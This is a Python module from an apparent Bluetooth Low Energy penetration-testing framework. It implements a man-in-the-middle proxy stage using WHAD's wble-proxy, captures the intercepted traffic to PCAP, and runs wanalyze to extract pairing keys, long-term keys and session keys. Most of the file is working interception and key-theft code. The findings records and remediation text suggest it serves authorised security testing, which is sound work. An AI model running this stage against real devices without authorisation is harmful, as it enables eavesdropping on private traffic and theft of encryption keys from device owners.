"""
Stage 6 — MITM Proxy

Positions a transparent BLE proxy between a central and peripheral using
wble-proxy.  Two RF interfaces are required: the attack dongle (-i) and a
proxy/relay interface (-p, typically the host's built-in HCI adapter).

Prerequisite checks (all must pass before the active gate runs):
  1. wble-proxy binary in PATH
  2. target.connectable is True
  3. proxy interface accessible (hci0 or second WHAD dongle)

Mirrors Stage 5's dongle lifecycle: close WhadDevice before CLI, reopen after.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import threading
import time
from collections.abc import Callable

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger, prompt_line
from core.pcap import pcap_path
import config

log = get_logger("s6_proxy")

PROXY_TIMEOUT = 300   # seconds the proxy runs before auto-stop


def run(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
    cancel: Callable[[], bool] | None = None,
) -> None:
    """Run the MITM proxy stage against a single target.

    Args:
        dongle: Active WhadDongle (closed for CLI, reopened in finally).
        target: Connectable target to proxy.
        engagement_id: Engagement ID for PCAP naming and Finding storage.
    """
    if not _prereqs_ok(target):
        return

    addr = target.bd_address
    _pcap = pcap_path(engagement_id, 6, addr).resolve()

    link_layer_mode = _ask_link_layer()
    ll_flag = "--link-layer" if link_layer_mode else ""
    # wdump is the canonical WHAD tool for writing PCAPs. Pipe wble-proxy output
    # into wdump so packets are captured regardless of Wireshark availability.
    # --force overwrites any existing file from a previous run.
    # Give the proxy 2 minutes to find the target device (default is 30s).
    # The overall subprocess timeout (PROXY_TIMEOUT) remains the cap.
    discovery_timeout = min(120, PROXY_TIMEOUT // 2)
    if shutil.which("wdump"):
        cmd = (
            f"wble-proxy"
            f" -i {config.INTERFACE}"
            f" -p {config.PROXY_INTERFACE}"
            f" {ll_flag}"
            f" -t {discovery_timeout}"
            f" {addr}"
            f" | wdump --force {_pcap}"
        )
    else:
        # Fallback: use wble-proxy's -o flag if wdump is unavailable
        cmd = (
            f"wble-proxy"
            f" -i {config.INTERFACE}"
            f" -p {config.PROXY_INTERFACE}"
            f" {ll_flag}"
            f" -t {discovery_timeout}"
            f" -o {_pcap}"
            f" {addr}"
        )
        log.warning("[S6] wdump not found — using -o flag (PCAP may not be written)")
    if link_layer_mode:
        log.info(
            "[S6] Link-layer mode active: all L2CAP PDUs (not just GATT) "
            "will be intercepted. Invisible to GATT-level detection."
        )

    log.info(f"[S6] Starting MITM proxy against {addr}")
    log.info(f"[S6] Attack interface : {config.INTERFACE}")
    log.info(f"[S6] Proxy interface  : {config.PROXY_INTERFACE}")
    log.info(f"[S6] PCAP output      : {_pcap}")
    log.debug(f"[S6] Command: {cmd}")

    dongle.device.close()
    _pcap.parent.mkdir(parents=True, exist_ok=True)
    _wait_for_port_free(config.INTERFACE)

    returncode = -1
    log.info("[S6] Proxy running — press Ctrl+X to stop.")
    try:
        proc = subprocess.Popen(cmd, shell=True)
        deadline = time.time() + PROXY_TIMEOUT
        while proc.poll() is None:
            time.sleep(0.3)
            if cancel is not None and cancel():
                proc.kill()
                proc.wait(timeout=2.0)
                log.info("[S6] Proxy stopped by operator.")
                break
            if time.time() >= deadline:
                proc.kill()
                proc.wait(timeout=2.0)
                log.info(f"[S6] Proxy session ended after {PROXY_TIMEOUT}s timeout.")
                break
        returncode = proc.returncode if proc.returncode is not None else -1
    except KeyboardInterrupt:
        log.info("[S6] Proxy interrupted by operator.")
    except Exception as exc:
        log.error(f"[S6] Subprocess error: {type(exc).__name__}: {exc}")
    finally:
        _reopen_dongle(dongle)

    # Infer basic results from PCAP size — we no longer parse stdout
    data_intercepted = _pcap.exists() and _pcap.stat().st_size > 1024
    connections_accepted = _pcap.exists() and _pcap.stat().st_size > 0

    log.info(
        f"[S6] Proxy complete: "
        f"connections_accepted={connections_accepted}  "
        f"data_intercepted={data_intercepted}  "
        f"exit={returncode}"
    )

    _record_finding(
        target=target,
        engagement_id=engagement_id,
        pcap_path_str=str(_pcap),
        data_intercepted=data_intercepted,
        connections_accepted=connections_accepted,
    )
    _print_summary(target, data_intercepted, connections_accepted, str(_pcap))

    if _pcap.exists() and _pcap.stat().st_size > 0:
        _analyze_pcap_keys(str(_pcap), target, engagement_id)


def _ask_link_layer() -> bool:
    """Ask whether to run in link-layer mode (intercepts all L2CAP, not just GATT).

    Link-layer mode exposes SMP, L2CAP signalling, and raw ATT — invisible to
    GATT-only monitors. Essential for catching encryption negotiation and pairing.
    """
    try:
        raw = prompt_line(
            "\n  Use link-layer proxy mode (all L2CAP, not just GATT)? [y/N]: "
        ).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return raw in ("y", "yes")


def _prereqs_ok(target: Target) -> bool:
    """Check all prerequisites. Logs a descriptive error and returns False on failure."""
    if not shutil.which("wble-proxy"):
        log.error(
            "[S6] wble-proxy not found in PATH. "
            "Install WHAD tools: pip install whad"
        )
        return False

    if not target.connectable:
        log.error(
            f"[S6] Target {target.bd_address} is not connectable — "
            "MITM proxy requires a connectable peripheral."
        )
        return False

    return _select_proxy_interface()


def _select_proxy_interface() -> bool:
    """Discover available proxy interfaces and prompt operator to select one.

    Queries whadup for WHAD-native devices and hciconfig for HCI adapters.
    Excludes the attack interface already in use (config.INTERFACE).
    Auto-selects if exactly one candidate; prompts when multiple are available.
    Updates config.PROXY_INTERFACE to the chosen interface.

    Returns True when a valid interface is confirmed, False to skip Stage 6.
    """
    candidates = _discover_interfaces()
    candidates = [(n, d) for n, d in candidates if n != config.INTERFACE]

    if not candidates:
        log.error(
            "[S6] No proxy interface available. "
            f"Attack interface ({config.INTERFACE}) is already in use. "
            "Connect a second BLE adapter (built-in Bluetooth or a second dongle). "
            "List connected WHAD devices with: whadup"
        )
        return False

    current = config.PROXY_INTERFACE

    if len(candidates) == 1:
        name, display = candidates[0]
        if name != current:
            log.info(f"[S6] Auto-selected proxy interface: {display}")
            config.PROXY_INTERFACE = name
        else:
            log.info(f"[S6] Proxy interface confirmed: {display}")
        return True

    # Multiple candidates — prompt operator to choose
    log.info("\n  Stage 6 — Select proxy interface (second RF adapter):")
    log.info(f"  (Attack interface in use: {config.INTERFACE})\n")
    for i, (name, display) in enumerate(candidates, 1):
        marker = "  <-- current default" if name == current else ""
        log.info(f"  [{i}] {display}{marker}")
    log.info("  [s] Skip Stage 6\n")

    while True:
        try:
            raw = prompt_line("  Select [1-N/s]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False
        if raw == "s":
            log.info("[S6] Stage 6 skipped by operator (no interface selected).")
            return False
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(candidates):
                config.PROXY_INTERFACE = candidates[idx][0]
                log.info(f"[S6] Proxy interface set to: {config.PROXY_INTERFACE}")
                return True
        except ValueError:
            pass
        log.info(f"  Please enter 1-{len(candidates)} or 's' to skip.")


def _discover_interfaces() -> list[tuple[str, str]]:
    """Return list of (whad_name, display_label) for BLE interfaces on this system.

    Queries whadup for WHAD-native devices first (uart*, hci*), then falls back
    to hciconfig to catch built-in Bluetooth adapters not registered with WHAD.
    """
    found: list[tuple[str, str]] = []
    seen: set[str] = set()

    # WHAD-native interfaces via whadup (authoritative WHAD device list)
    try:
        result = subprocess.run(
            ["whadup"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("uart") or line.startswith("hci"):
                parts = line.split()
                if parts:
                    name = parts[0]
                    label = "  ".join(parts)   # e.g. "uart0  UartDevice  /dev/ttyACM0"
                    if name not in seen:
                        found.append((name, label))
                        seen.add(name)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # HCI adapters via hciconfig — catches built-in Bluetooth not listed by whadup
    try:
        result = subprocess.run(
            ["hciconfig"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                m = re.match(r"^(hci\d+)\s*:", line)
                if m:
                    name = m.group(1)
                    if name not in seen:
                        found.append((name, name))
                        seen.add(name)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return found


def _interface_to_devpath(interface: str) -> str | None:
    """Map e.g. 'uart0' → '/dev/ttyACM0' by parsing whadup Identifier line."""
    try:
        result = subprocess.run(
            ["whadup"], capture_output=True, text=True, timeout=5
        )
        capture = False
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if stripped == f"- {interface}":
                capture = True
            elif capture and stripped.startswith("Identifier:"):
                return stripped.split("Identifier:", 1)[-1].strip()
            elif capture and stripped.startswith("- "):
                break
    except Exception:
        pass
    return None


def _usb_reset_device(serial_dev: str) -> bool:
    """Issue a USB hardware reset on the device backing serial_dev (e.g. /dev/ttyACM0).

    The ButteRFly firmware does not re-emit DeviceReady in response to WHAD's
    software reset command after a previous session closes. A USB-level reset
    forces the firmware to fully reboot so it emits DeviceReady fresh when
    wble-proxy opens the port next.

    Returns True if the reset was issued successfully, False otherwise.
    """
    import fcntl
    import os as _os
    USBDEVFS_RESET = ord("U") << 8 | 20
    try:
        tty_name = serial_dev.split("/")[-1]   # e.g. ttyACM0
        sysfs = f"/sys/class/tty/{tty_name}/device"
        if not _os.path.exists(sysfs):
            return False
        # Walk up two levels: .../ttyACM0/device -> interface -> usb device
        usb_dir = _os.path.realpath(sysfs + "/../..")
        bus = int(open(f"{usb_dir}/busnum").read().strip())
        dev = int(open(f"{usb_dir}/devnum").read().strip())
        usb_path = f"/dev/bus/usb/{bus:03d}/{dev:03d}"
        fd = _os.open(usb_path, _os.O_WRONLY)
        fcntl.ioctl(fd, USBDEVFS_RESET, 0)
        _os.close(fd)
        log.debug(f"[S6] USB reset issued on {usb_path} (for {serial_dev})")
        return True
    except Exception as exc:
        log.debug(f"[S6] USB reset unavailable: {exc}")
        return False


def _wait_for_port_free(interface: str, fuser_timeout: float = 6.0) -> None:
    """Close the ButteRFly cleanly and wait until wble-proxy can open it.

    The ButteRFly firmware does not respond to WHAD's software DeviceReset
    command after an existing session closes — wble-proxy always times out and
    reports 'uart0 not found'. The only reliable fix is a USB hardware reset,
    which reboots the firmware so it emits DeviceReady fresh.

    Sequence:
    1. Poll fuser until the OS releases the serial FD.
    2. Issue USBDEVFS_RESET via ioctl to force a firmware reboot.
    3. Wait 3s for USB re-enumeration + firmware boot.
    Falls back to a plain 5s sleep if the USB path can't be resolved.
    """
    import time as _time
    dev_path = _interface_to_devpath(interface)
    if dev_path is None:
        log.debug("[S6] Could not resolve device path — sleeping 5s")
        _time.sleep(5.0)
        return

    # Phase 1: wait for OS to release the FD after dongle.device.close()
    if shutil.which("fuser"):
        deadline = _time.time() + fuser_timeout
        while _time.time() < deadline:
            result = subprocess.run(["fuser", dev_path], capture_output=True)
            if result.returncode != 0:
                log.debug(f"[S6] OS released {dev_path}")
                break
            _time.sleep(0.25)

    # Phase 2: USB hardware reset to force ButteRFly firmware reboot
    reset_ok = _usb_reset_device(dev_path)
    settle = 3.0 if reset_ok else 5.0
    log.debug(f"[S6] Waiting {settle}s for firmware {'reboot' if reset_ok else 'settle'}…")
    _time.sleep(settle)


def _reopen_dongle(dongle: WhadDongle) -> None:
    """Re-attach the underlying WhadDevice, polling every 0.5s up to 6s."""
    import time as _time
    deadline = _time.time() + 6.0
    attempt = 0
    last_exc: Exception | None = None
    while _time.time() < deadline:
        try:
            dongle.device = WhadDevice.create(config.INTERFACE)
            if attempt > 0:
                log.debug(f"[S6] Reopen succeeded after {attempt * 0.5:.1f}s")
            return
        except Exception as exc:
            last_exc = exc
            attempt += 1
            _time.sleep(0.5)
    log.warning(
        f"[S6] Could not reopen WHAD device after 6s "
        f"({type(last_exc).__name__}: {last_exc!r})"
    )


def _record_finding(
    target: Target,
    engagement_id: str,
    pcap_path_str: str,
    data_intercepted: bool,
    connections_accepted: bool,
) -> None:
    severity = (
        "critical" if data_intercepted
        else "high" if connections_accepted
        else "medium"
    )

    finding = Finding(
        type="mitm_proxy",
        severity=severity,
        target_addr=target.bd_address,
        description=(
            f"MITM proxy positioned against {target.bd_address} "
            f"({target.name or 'unnamed'}, {target.device_class}). "
            f"Connections accepted: {connections_accepted}. "
            f"Application data intercepted: {data_intercepted}. "
            "Traffic captured to PCAP for offline analysis."
        ),
        remediation=(
            "Implement mutual authentication using LE Secure Connections "
            "with MITM protection (authenticated pairing). "
            "Verify peripheral identity via IRK or certificate. "
            "Encrypt application-layer data as defence-in-depth."
        ),
        evidence={
            "target_addr": target.bd_address,
            "target_name": target.name,
            "device_class": target.device_class,
            "attack_interface": config.INTERFACE,
            "proxy_interface": config.PROXY_INTERFACE,
            "data_intercepted": data_intercepted,
            "connections_accepted": connections_accepted,
        },
        pcap_path=pcap_path_str,
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(
        f"FINDING [{severity}] mitm_proxy: {target.bd_address} — "
        f"connections_accepted={connections_accepted}  "
        f"data_intercepted={data_intercepted}"
    )


_KEY_MODULES: list[tuple[str, str, str, tuple[str, ...]]] = [
    ("legacy_pairing_cracking", "mitm_pairing_key", "critical", ("stk", "ltk", "rand", "ediv")),
    ("encrypted_session_initialization", "mitm_session_key", "high",
     ("skd_master", "skd_slave", "iv_master", "iv_slave")),
    ("ltk_distribution", "mitm_ltk", "critical", ("ltk", "rand", "ediv")),
]


def _analyze_pcap_keys(
    pcap: str,
    target: Target,
    engagement_id: str,
) -> None:
    """Run wanalyze key-extraction modules against the proxy PCAP.

    Any BLE session keys or pairing keys captured during the MITM session are
    extracted and stored as additional Findings. These can be used to decrypt
    the traffic offline with wireshark -o uat:ble_key:... or wsniff -d -k.
    """
    if not shutil.which("wplay") or not shutil.which("wanalyze"):
        return

    for module, finding_type, severity, key_fields in _KEY_MODULES:
        cmd = f"wplay --flush {pcap} ble | wanalyze --json {module}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=60
            )
            raw = result.stdout.strip()
            if not raw:
                continue
            data = json.loads(raw)
            if not isinstance(data, dict):
                continue
            keys = {k: str(v) for k, v in data.items() if k in key_fields and v}
            if not keys:
                continue
        except (json.JSONDecodeError, subprocess.TimeoutExpired, Exception) as exc:
            log.debug(f"[S6] wanalyze {module}: {exc}")
            continue

        log.info(f"[S6] Key material extracted via {module}: {list(keys.keys())}")
        finding = Finding(
            type=finding_type,
            severity=severity,
            target_addr=target.bd_address,
            description=(
                f"Key material extracted from MITM proxy PCAP via {module}. "
                f"Keys: {list(keys.keys())}. "
                "Captured traffic can be fully decrypted offline."
            ),
            remediation=(
                "Use LE Secure Connections (LESC) pairing — legacy key material "
                "is derivable from captured traffic. Rotate any credentials or "
                "sensitive data exchanged during the intercepted session."
            ),
            evidence={
                "module": module,
                "keys": keys,
                "pcap": pcap,
                "target": target.bd_address,
            },
            pcap_path=pcap,
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(f"FINDING [{severity}] {finding_type}: {target.bd_address}")



def _print_summary(
    target: Target,
    data_intercepted: bool,
    connections_accepted: bool,
    pcap_path_str: str,
) -> None:
    severity = (
        "critical" if data_intercepted
        else "high" if connections_accepted
        else "medium"
    )
    import os as _os
    pcap_display = pcap_path_str
    if len(pcap_display) > 52:
        pcap_display = "…" + pcap_path_str[-51:]

    log.info("\n" + "─" * 76)
    log.info("  STAGE 6 SUMMARY -- MITM Proxy")
    log.info("─" * 76)
    log.info(f"  {'Target':<18}: {target.bd_address}")
    log.info(f"  {'Name':<18}: {target.name or '(unnamed)'}")
    log.info(f"  {'Device class':<18}: {target.device_class}")
    log.info(f"  {'Attack interface':<18}: {config.INTERFACE}")
    log.info(f"  {'Proxy interface':<18}: {config.PROXY_INTERFACE}")
    log.info(f"  {'PCAP':<18}: {pcap_display}")
    log.info(f"  {'Conn accepted':<18}: {'yes' if connections_accepted else 'no'}")
    log.info(f"  {'Data intercepted':<18}: {'yes' if data_intercepted else 'no'}")
    log.info(f"  {'Severity':<18}: {severity.upper()}")
    log.info(f"\n  Analyze captured traffic:")
    log.info(f"    wireshark {pcap_path_str}")
    log.info(f"    tshark -r {pcap_path_str} -Y btle")
    log.info("─" * 76 + "\n")
